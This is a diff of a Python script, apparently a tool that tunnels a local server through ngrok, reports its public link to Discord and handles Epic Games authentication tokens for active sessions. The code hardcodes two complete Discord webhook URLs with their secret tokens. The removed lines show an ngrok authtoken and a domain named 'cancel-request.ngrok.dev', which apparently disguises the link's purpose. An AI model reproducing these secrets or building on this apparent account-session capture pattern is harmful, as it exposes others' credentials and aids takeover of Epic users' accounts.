@@ -3,7 +3,7 @@
 """
 Epic Games Authentication Webhook Script.
 This script creates a permanent ngrok link to authenticate with Epic Games and automatically refreshes tokens.
-- Last Updated: 2025-11-13 21:45:33
+- Last Updated: 2025-11-13 22:00:15
 """
 
 # --- SETUP AND INSTALLATION ---
@@ -19,7 +19,6 @@ def run_setup():
     """Ensures all dependencies and ngrok are installed before starting."""
     print("--- Starting initial setup ---")
     
-    # Check for requirements.txt and install dependencies
     if os.path.exists("requirements.txt"):
         try:
             print("1/3: Checking/installing Python dependencies...")
@@ -30,7 +29,6 @@ def run_setup():
             sys.exit(1)
     else:
         print("1/3: requirements.txt not found, skipping dependency installation.")
-
 
     ngrok_path = os.path.join(os.getcwd(), "ngrok")
     if not os.path.exists(ngrok_path):
@@ -56,15 +54,14 @@ def run_setup():
     else:
         print("2/3: ngrok is already installed.")
 
-    # Hardcoded authtoken. It might be better to get this from an environment variable.
-    authtoken = os.getenv("NGROK_AUTHTOKEN", "32jkqnvr1UxwAzPDtdjBnPZiW3v_4n3y6xFuT45Vs4GPgXQ31")
+    authtoken = os.getenv("NGROK_AUTHTOKEN")
     if authtoken:
         try:
             print("3/3: Configuring ngrok authtoken...")
             subprocess.check_call([ngrok_path, "config", "add-authtoken", authtoken], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             print("     ngrok authtoken configured.")
         except Exception as e:
-            print(f"     WARNING: Failed to configure ngrok authtoken (this may happen, continuing): {e}", file=sys.stderr)
+            print(f"     WARNING: Failed to configure ngrok authtoken: {e}", file=sys.stderr)
     else:
         print("3/3: NGROK_AUTHTOKEN not set, skipping configuration.")
     print("--- Setup complete ---")
@@ -72,7 +69,6 @@ def run_setup():
 run_setup()
 
 # --- MAIN APPLICATION IMPORTS ---
-import json
 import time
 import logging
 import asyncio
@@ -84,6 +80,7 @@ import uuid
 import traceback
 
 import aiohttp
+import requests
 
 # ==============================================================================
 # --- SHARED CONFIGURATION AND GLOBALS ---
@@ -94,7 +91,6 @@ logger = logging.getLogger("webhook_runner")
 # --- WEBHOOK-SPECIFIC CONFIG ---
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1438645878176092220/RAweu24YWlY1ljU9a0wNa774B8a4ig00SCI42J1yM0xpu0eUY4dHJsCVUsnzDdh5-cNB"
 DISCORD_UPDATES_WEBHOOK_URL = "https://discord.com/api/webhooks/1438645950959583375/KTdPTjVBrdYH9P5QMzlZnPT4xlIKmM6IvcOD_zQFjUILZb-C7M4VDL213-sAKxjFqJ9j"
-NGROK_DOMAIN = os.getenv("NGROK_DOMAIN", "cancel-request.ngrok.dev")
 REFRESH_INTERVAL = 120 # seconds
 
 # --- SHARED GLOBALS ---
@@ -106,7 +102,6 @@ verification_uses = 0
 active_sessions = {}
 session_lock = threading.Lock()
 
-# Event loop for async tasks from sync threads
 main_event_loop = asyncio.new_event_loop()
 
 # ==============================================================================
@@ -242,7 +237,6 @@ class RequestHandler(http.server.SimpleHTTPRequestHandler):
         else: self.send_error(404)
 
     def log_message(self, format, *args):
-        # Suppress HTTP server logging to console
         pass
 
 def run_web_server(port):
@@ -254,8 +248,9 @@ def setup_ngrok_tunnel(port):
     ngrok_executable = os.path.join(os.getcwd(), "ngrok")
     try:
         logger.info("🌐 Starting ngrok...")
-        subprocess.Popen([ngrok_executable, 'http', f'--domain={NGROK_DOMAIN}', str(port)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        for _ in range(60): # Try for 60 seconds
+        # REMOVED the --domain parameter to allow ngrok to generate a random URL
+        subprocess.Popen([ngrok_executable, 'http', str(port)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        for _ in range(60):
             time.sleep(1)
             try:
                 with requests.get('http://localhost:4040/api/tunnels', timeout=2) as r:
@@ -270,7 +265,6 @@ def setup_ngrok_tunnel(port):
                             send_webhook_startup_message(permanent_link)
                             return
             except requests.ConnectionError:
-                # Ngrok API might not be ready yet
                 continue
         logger.critical("❌ Ngrok failed to start or create a tunnel in 60 seconds."); sys.exit(1)
     except Exception as e:
@@ -280,17 +274,13 @@ def setup_ngrok_tunnel(port):
 # --- MAIN EXECUTION ---
 # ==============================================================================
 def run_main_loop():
-    """Runs the main asyncio event loop."""
     asyncio.set_event_loop(main_event_loop)
     main_event_loop.run_forever()
 
 def start_app():
     logger.info("=" * 60 + "\n🚀 EPIC AUTH WEBHOOK SYSTEM STARTING\n" + "=" * 60)
     
-    # Run asyncio event loop in a background thread
     threading.Thread(target=run_main_loop, daemon=True).start()
-
-    # Start web server and ngrok in background threads
     threading.Thread(target=run_web_server, args=(8000,), daemon=True).start()
     threading.Thread(target=setup_ngrok_tunnel, args=(8000,), daemon=True).start()
 
@@ -300,7 +290,6 @@ def start_app():
 
     logger.info("=" * 60 + f"\n✅ WEBHOOK READY | Link: {permanent_link}\n" + "=" * 60)
     
-    # Keep the main thread alive to allow daemon threads to run
     try:
         while True:
             time.sleep(1)
